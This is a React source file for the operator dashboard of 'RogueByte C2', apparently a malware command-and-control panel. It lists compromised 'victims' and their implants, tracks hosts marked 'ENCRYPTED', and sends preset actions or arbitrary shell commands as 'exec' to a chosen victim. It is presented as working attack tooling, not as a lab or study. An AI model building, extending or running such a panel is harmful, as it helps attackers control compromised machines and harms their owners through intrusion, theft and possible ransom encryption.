import React, { useState, useEffect, useRef, useCallback } from 'react';
import { 
  ShieldAlert, 
  Database, 
  Terminal, 
  HelpCircle, 
  Search,
  Moon,
  Package,
  Bell,
  Power,
} from 'lucide-react';
import useSocket from './hooks/useSocket';
import { Victim, LogEntry, backendVictimToDashboard, backendLogToDashboard, COMMAND_MAP } from './types';
import { VictimItem } from './components/VictimItem';
import { VictimDetail } from './components/VictimDetail';
import { CommandLog } from './components/CommandLog';
import { IntelligenceFeed } from './components/IntelligenceFeed';
import { HelpModal } from './components/HelpModal';
import { LoginPage } from './components/LoginPage';
import { PluginsPanel } from './components/PluginsPanel';
import { AlertRules } from './components/AlertRules';
import { AlertLog } from './components/AlertLog';

let logIdCounter = 0;

export default function App() {
  const { victims: backendVictims, logs: backendLogs, connected, locked, needsSetup, unlockError, autoDeploy, alertLog, sendCommand, unlockServer, setupPassword, clearUnlockError, clearLogs } = useSocket();
  const [selectedID, setSelectedID] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState<string>('');
  const [statusFilter, setStatusFilter] = useState<string>('ALL');
  const [cliCommand, setCliCommand] = useState<string>('');
  const [actionInProgress, setActionInProgress] = useState<boolean>(false);
  const [isHelpOpen, setIsHelpOpen] = useState<boolean>(false);
  const [isServerOnline, setIsServerOnline] = useState<boolean>(true);
  const [contrastMode, setContrastMode] = useState<boolean>(false);
  const [activeTab, setActiveTab] = useState<'implants' | 'plugins' | 'alerts'>('implants');
  const [toastMessage, setToastMessage] = useState<{ title: string; message: string; type: 'success' | 'danger' | 'warning' } | null>({
    title: 'C2 BROADCAST ONLINE',
    message: 'Encrypted tactical tunnel established to server clusters',
    type: 'success',
  });

  const logsEndRef = useRef<HTMLDivElement>(null);

  // Convert backend victims to dashboard format
  const victims: Victim[] = Object.entries(backendVictims).map(([hostname, info]) =>
    backendVictimToDashboard(hostname, info)
  );

  // Convert backend logs to dashboard format
  const logs: LogEntry[] = backendLogs.map((entry) => backendLogToDashboard(entry));

  const selectedVictim = victims.find(v => v.id === selectedID) || victims[0] || null;

  // Update selectedID when victims change and current selection is gone
  useEffect(() => {
    if (selectedID && !victims.find(v => v.id === selectedID)) {
      setSelectedID(victims[0]?.id || null);
    }
  }, [victims, selectedID]);

  // Auto-select first victim when they appear
  useEffect(() => {
    if (!selectedID && victims.length > 0) {
      setSelectedID(victims[0].id);
    }
  }, [victims, selectedID]);

  useEffect(() => {
    if (toastMessage) {
      const timer = setTimeout(() => {
        setToastMessage(null);
      }, 6000);
      return () => clearTimeout(timer);
    }
  }, [toastMessage]);

  const handleAction = useCallback((actionType: string) => {
    if (!selectedVictim) return;
    setActionInProgress(true);

    const backendCmd = COMMAND_MAP[actionType] || actionType;
    sendCommand(selectedVictim.id, backendCmd, {});

    setToastMessage({
      title: 'COMMAND BROADCAST',
      message: `${actionType} sent to ${selectedVictim.id}`,
      type: 'success',
    });

    setTimeout(() => setActionInProgress(false), 500);
  }, [selectedVictim, sendCommand]);

  const handleCliSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!cliCommand.trim() || !selectedVictim) return;

    const commandText = cliCommand.trim();
    setCliCommand('');

    // Parse simple commands — everything else is sent as exec
    if (commandText.toLowerCase() === 'help') {
      setToastMessage({
        title: 'AVAILABLE COMMANDS',
        message: 'Type a command or use the action buttons. Commands are sent as "exec" to the target.',
        type: 'success',
      });
      return;
    }

    sendCommand(selectedVictim.id, 'exec', { cmd: commandText });
    setToastMessage({
      title: 'EXEC BROADCAST',
      message: `"${commandText}" sent to ${selectedVictim.id}`,
      type: 'success',
    });
  };

  const handleClearLogs = () => {
    clearLogs();
    setToastMessage({
      title: 'BUFFER CLEARED',
      message: 'Local telemetry storage buffer flushed successfully',
      type: 'warning',
    });
  };

  const filteredVictims = victims.filter(v => {
    const matchesSearch = v.hostname.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          v.ip.includes(searchTerm) ||
                          v.os.toLowerCase().includes(searchTerm.toLowerCase());
    if (statusFilter === 'ALL') return matchesSearch;
    return matchesSearch && v.status === statusFilter;
  });

  if (locked) {
    return (
      <LoginPage
        needsSetup={needsSetup}
        error={unlockError}
        onUnlock={unlockServer}
        onSetup={setupPassword}
        onErrorClear={clearUnlockError}
        connected={connected}
      />
    );
  }

  if (!isServerOnline) {
    return (
      <div className="min-h-screen text-slate-100 font-mono flex flex-col items-center justify-center bg-[#05070a] p-6 relative overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(rgba(13,110,253,0.04)_1px,transparent_1px)] bg-[size:16px_16px] pointer-events-none"></div>
        <div className="w-full max-w-xl bg-slate-950 border-2 border-rose-500/40 rounded-xl p-8 shadow-2xl relative z-10">
          <div className="flex items-center gap-3 border-b border-rose-500/20 pb-4 mb-6">
            <div className="h-10 w-10 bg-rose-500/10 text-rose-500 border border-rose-500/30 rounded-lg flex items-center justify-center animate-pulse">
              <Power className="h-5 w-5" />
            </div>
            <div>
              <h1 className="text-sm font-bold text-rose-500 tracking-wider">ROGUEBYTE C2 SERVER HALT COMPLETED</h1>
              <p className="text-[10px] text-slate-500 uppercase tracking-widest mt-0.5">Daemon level 0 halt sequence active</p>
            </div>
          </div>
          <div className="bg-slate-900/40 p-4 rounded-lg border border-slate-800/80 mb-6 text-xs text-slate-300 font-mono space-y-2 select-none">
            <div><span className="text-rose-500 font-bold">[00:01]</span> FLUSHING EPHEMERAL BUFFER STORAGE... DONE</div>
            <div><span className="text-rose-500 font-bold">[00:02]</span> UNLOADING TARGET CONTEXT IMPLANT AGENTS... DONE</div>
            <div><span className="text-rose-500 font-bold">[00:03]</span> ERASING DIAGNOSTIC RECORDS AND MEMORY ARRAYS... SANITIZED</div>
            <div><span className="text-rose-500 font-bold">[00:04]</span> SUSPENDING CONTROLLER SOCKETS... DISCONNECTED</div>
            <div><span className="text-rose-500 font-bold">[00:05]</span> DAEMON STATE: <span className="text-rose-500 font-bold">OFFLINE</span></div>
          </div>
          <div className="flex flex-col gap-3">
            <p className="text-[11px] text-slate-400 leading-relaxed text-center font-sans">
              Warning: The C2 service daemon has gracefully shutdown. Targets cannot beacon back until the server starts up again.
            </p>
            <button
              onClick={() => {
                setIsServerOnline(true);
                setToastMessage({
                  title: 'ROGUEBYTE C2 DEPLOYMENT LIVE',
                  message: 'Daemon is active. Handshaking with automated implants.',
                  type: 'success',
                });
              }}
              className="w-full py-3 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold rounded-lg text-xs tracking-wider uppercase transition cursor-pointer flex items-center justify-center gap-2 shadow shadow-cyan-500/30 font-sans"
            >
              <Power className="h-4 w-4" />
              BOOT C2 DEPLOYMENT DAEMON
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen text-slate-100 font-sans flex flex-col bg-[#080c14] overflow-x-hidden md:h-screen">
      
      <header className="shrink-0 flex items-center justify-between px-5 md:px-6 h-14 bg-slate-950 border-b border-slate-900 gap-4">
        
        <div className="flex items-center gap-3">
          <div className="relative group flex items-center justify-center">
            <div className="h-9 w-9 bg-cyan-900/20 text-cyan-400 border border-cyan-500/50 rounded-lg flex items-center justify-center relative overflow-hidden transition-all duration-300 shadow shadow-cyan-800/30">
              <span className="font-mono text-xs font-bold text-cyan-400 tracking-tighter">RB</span>
            </div>
            <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5 justify-center">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
            </span>
          </div>
          <div className="flex flex-col">
            <div className="flex items-center gap-2">
              <span className="font-sans text-sm font-black text-slate-200 tracking-wider">ROGUEBYTE C2</span>
              <span className="text-[9px] bg-cyan-950 text-cyan-400 px-1.5 py-0.2 rounded font-mono font-bold tracking-widest border border-cyan-500/20">V0.1.9-Beta</span>
            </div>
            <span className="hidden sm:inline font-mono text-[9px] text-slate-500 tracking-wider uppercase leading-none mt-0.5">
              PERSISTENT COMMAND & CONTROL INTERACTIVE FABRIC
            </span>
          </div>
        </div>

        <div className="hidden lg:flex items-center gap-6">
          <div className="flex items-center gap-2 px-3 py-1 bg-slate-950/80 rounded-lg border border-slate-900">
            <span className={`flex h-2 w-2 rounded-full ${connected ? 'bg-emerald-400 online-pulse' : 'bg-rose-500'}`}></span>
            <span className="font-mono text-[10px] font-bold tracking-wider">{connected ? 'SECURE TUNNEL ACTIVE' : 'DISCONNECTED'}</span>
          </div>
          <div className="flex items-center gap-4 border-l border-slate-800 pl-4">
            <div className="flex flex-col items-start leading-none">
              <span className="font-mono text-[9px] text-slate-500 font-bold uppercase tracking-wider">TOTAL IMPLANTS</span>
              <span className="font-mono text-xs text-primary font-bold mt-1">{victims.length} ACTIVE</span>
            </div>
            <div className="flex flex-col items-start leading-none">
              <span className="font-mono text-[9px] text-slate-500 font-bold uppercase tracking-wider">ONLINE AGENTS</span>
              <span className="font-mono text-xs text-emerald-400 font-bold mt-1">
                {victims.filter(v => v.status === 'ONLINE').length} LIVE
              </span>
            </div>
            <div className="flex flex-col items-start leading-none">
              <span className="font-mono text-[9px] text-slate-500 font-bold uppercase tracking-wider">ENCRYPTED</span>
              <span className="font-mono text-xs text-rose-400 font-bold mt-1">
                {victims.filter(v => v.status === 'ENCRYPTED').length} NODES
              </span>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-2.5">
          <button
            onClick={() => {
              setContrastMode(!contrastMode);
              setToastMessage({
                title: 'HUD CONTRAST MODIFIED',
                message: `HUD interface recalibrated to ${!contrastMode ? 'Matrix Neon' : 'Tactical Slate'} aesthetic.`,
                type: 'success',
              });
            }}
            className={`p-1.5 transition rounded-lg border cursor-pointer ${
              contrastMode 
                ? 'text-amber-400 bg-amber-950/20 border-amber-800/40' 
                : 'text-slate-400 hover:text-primary hover:bg-slate-900/60 border-slate-800'
            }`}
            title="Toggle contrast viewport matrices theme"
          >
            <Moon className="h-4.5 w-4.5" />
          </button>

          <button
            onClick={() => setIsHelpOpen(true)}
            className="p-1.5 text-slate-400 hover:text-primary hover:bg-slate-900/60 transition rounded-lg border border-slate-800 cursor-pointer"
            title="Open Operator Instructions manual"
          >
            <HelpCircle className="h-4.5 w-4.5" />
          </button>

          <button
            onClick={() => setIsServerOnline(false)}
            className="p-1.5 text-rose-500 hover:text-white bg-rose-950/20 hover:bg-rose-900/60 transition rounded-lg border border-rose-900/40 cursor-pointer animate-pulse"
            title="EMERGENCY SHUTDOWN C2 SERVER DAEMON"
          >
            <Power className="h-4.5 w-4.5" />
          </button>
        </div>
      </header>

      <div className="shrink-0 flex items-center gap-1 px-5 py-1.5 bg-slate-950/80 border-b border-slate-900">
        <button onClick={() => setActiveTab('implants')}
          className={`px-3 py-1.5 rounded-lg text-[10px] font-bold uppercase tracking-wider transition cursor-pointer ${
            activeTab === 'implants' ? 'bg-cyan-500/15 text-cyan-400 border border-cyan-500/30' : 'text-slate-500 hover:text-slate-300 border border-transparent'
          }`}>
          <Database className="h-3 w-3 inline mr-1.5" />Implants
        </button>
        <button onClick={() => setActiveTab('plugins')}
          className={`px-3 py-1.5 rounded-lg text-[10px] font-bold uppercase tracking-wider transition cursor-pointer ${
            activeTab === 'plugins' ? 'bg-cyan-500/15 text-cyan-400 border border-cyan-500/30' : 'text-slate-500 hover:text-slate-300 border border-transparent'
          }`}>
          <Package className="h-3 w-3 inline mr-1.5" />Plugins
        </button>
        <button onClick={() => setActiveTab('alerts')}
          className={`px-3 py-1.5 rounded-lg text-[10px] font-bold uppercase tracking-wider transition cursor-pointer ${
            activeTab === 'alerts' ? 'bg-cyan-500/15 text-cyan-400 border border-cyan-500/30' : 'text-slate-500 hover:text-slate-300 border border-transparent'
          }`}>
          <Bell className="h-3 w-3 inline mr-1.5" />Alerts
        </button>
        <div className="flex-1" />
        <span className="text-[9px] text-slate-600 font-mono">{victims.length} implants · {alertLog.length} alerts</span>
      </div>

      {activeTab === 'implants' && (
        <div className="flex-1 flex flex-col md:flex-row overflow-hidden min-h-0">
          
          <section className="flex-1 md:flex-[1.5] lg:flex-[1.7] flex flex-col border-r border-slate-900 bg-slate-950/60 overflow-hidden min-h-[400px] md:min-h-0">
            
            <div className="px-5 py-3 flex flex-col sm:flex-row gap-3 items-center justify-between bg-slate-900/40 border-b border-slate-900 shrink-0">
              <div className="flex items-center gap-2 w-full sm:w-auto">
                <Database className="h-4 w-4 text-primary" />
                <h1 className="font-mono text-xs font-bold text-primary uppercase tracking-wider">
                  TARGET IMPLANTS DIRECTORY ({filteredVictims.length})
                </h1>
              </div>
              <div className="flex items-center gap-2 w-full sm:w-auto">
                <div className="relative flex-1 sm:flex-initial">
                  <Search className="absolute left-2.5 top-2 h-3.5 w-3.5 text-slate-500" />
                  <input
                    type="text"
                    placeholder="Hostname, IP, OS..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="w-full sm:w-44 bg-slate-950/80 border border-slate-900 rounded-lg pl-8 pr-2.5 py-1.5 text-xs text-slate-300 placeholder:text-slate-600 focus:outline-none focus:border-cyan-500/80 font-mono transition-colors"
                  />
                </div>
                <select
                  value={statusFilter}
                  onChange={(e) => setStatusFilter(e.target.value)}
                  className="bg-slate-950/80 border border-slate-900 rounded-lg px-2.5 py-1.5 text-xs text-slate-300 focus:outline-none focus:border-cyan-500/80 font-mono transition-colors shrink-0"
                >
                  <option value="ALL">Status: All</option>
                  <option value="ONLINE">Online Status</option>
                  <option value="ENCRYPTED">Encrypted Status</option>
                  <option value="WATCHDOG">Watchdog Triggered</option>
                  <option value="OFFLINE">Offline State</option>
                </select>
              </div>
            </div>

            <div className="flex-1 overflow-y-auto custom-scrollbar p-5 space-y-3">
              {filteredVictims.length === 0 ? (
                <div className="text-center py-12 text-slate-600 font-mono text-xs italic">
                  &lt; No targets found matching query parameters &gt;
                </div>
              ) : (
                filteredVictims.map((v) => (
                  <VictimItem
                    key={v.id}
                    victim={v}
                    isSelected={v.id === selectedID}
                    onSelect={() => setSelectedID(v.id)}
                  />
                ))
              )}
            </div>
          </section>

          <section className="flex-1 md:flex-[1.2] lg:flex-[1.4] flex flex-col border-r border-slate-900 bg-slate-950/20 overflow-y-auto custom-scrollbar p-5 gap-5 min-h-[400px] md:min-h-0">
            <div>
              <span className="font-mono text-[9px] text-slate-500 font-bold uppercase tracking-widest block mb-1">
                ACTIVE NODE CONTROL CONSOLE
              </span>
              <h2 className="font-sans text-sm font-black text-primary tracking-tight uppercase">
                Implant Operation Center
              </h2>
            </div>

            {selectedVictim ? (
              <VictimDetail
                victim={selectedVictim}
                onAction={handleAction}
                isActionInProgress={actionInProgress}
              />
            ) : (
              <div className="p-8 text-center text-slate-500 font-mono text-xs italic border border-dashed border-slate-800 rounded-xl my-auto">
                Waiting for agents to beacon...
              </div>
            )}

            <IntelligenceFeed victims={victims} />
          </section>

          <section className="flex-1 md:flex-[1.4] lg:flex-[1.6] flex flex-col bg-slate-950/80 overflow-hidden min-h-[450px] md:min-h-0">
            <CommandLog logs={logs} onClearLogs={handleClearLogs} />

            <form 
              onSubmit={handleCliSubmit}
              className="p-3 bg-slate-950 border-t border-slate-900 flex items-center gap-3 shrink-0"
            >
              <span className="text-primary font-bold font-mono text-xs select-none">$&gt;</span>
              <input
                type="text"
                value={cliCommand}
                onChange={(e) => setCliCommand(e.target.value)}
                placeholder="Type a command and press Enter to execute on the selected target"
                className="bg-transparent border-none outline-none focus:outline-none focus:ring-0 text-xs font-mono text-primary flex-1 placeholder:text-slate-700/80"
              />
              <div className="flex gap-2">
                <span className="hidden sm:inline font-mono text-[9px] text-slate-500 px-1.5 py-0.5 border border-slate-800 rounded select-none uppercase tracking-wider">
                  Press Enter
                </span>
              </div>
            </form>
          </section>
        </div>
      )}

      {activeTab === 'plugins' && (
        <div className="flex-1 flex flex-col overflow-hidden">
          <PluginsPanel
            victims={victims}
            sendCommand={sendCommand}
            setToastMessage={setToastMessage}
          />
        </div>
      )}

      {activeTab === 'alerts' && (
        <div className="flex-1 flex flex-col md:flex-row overflow-hidden min-h-0">
          <section className="flex-1 md:flex-[1.2] flex flex-col overflow-y-auto custom-scrollbar p-5 gap-5 bg-slate-950/40 border-r border-slate-900">
            <AlertRules setToastMessage={setToastMessage} />
          </section>
          <section className="flex-1 md:flex-[1] flex flex-col overflow-y-auto custom-scrollbar p-5 bg-slate-950/80">
            <AlertLog liveEntries={alertLog} />
          </section>
        </div>
      )}

      {toastMessage && (
        <div className="fixed top-16 right-4 z-[105] flex flex-col gap-2 max-w-sm pointer-events-none">
          <div className={`p-4 rounded-xl border shadow-2xl flex items-start gap-3 bg-slate-900 animate-pulse transition-all ${
            toastMessage.type === 'danger' 
              ? 'border-rose-500/30 text-rose-400 shadow-rose-950/30' 
              : toastMessage.type === 'warning'
              ? 'border-amber-500/30 text-amber-400 shadow-amber-950/30'
              : 'border-cyan-500/30 text-cyan-400 shadow-cyan-950/30'
          }`}>
            <ShieldAlert className="h-4.5 w-4.5 shrink-0 mt-0.5" />
            <div>
              <h4 className="font-mono text-[11px] font-bold uppercase tracking-wider leading-none mb-1">
                {toastMessage.title}
              </h4>
              <p className="text-[11px] text-slate-300 leading-tight">
                {toastMessage.message}
              </p>
            </div>
          </div>
        </div>
      )}

      {isHelpOpen && <HelpModal onClose={() => setIsHelpOpen(false)} />}
    </div>
  );
}
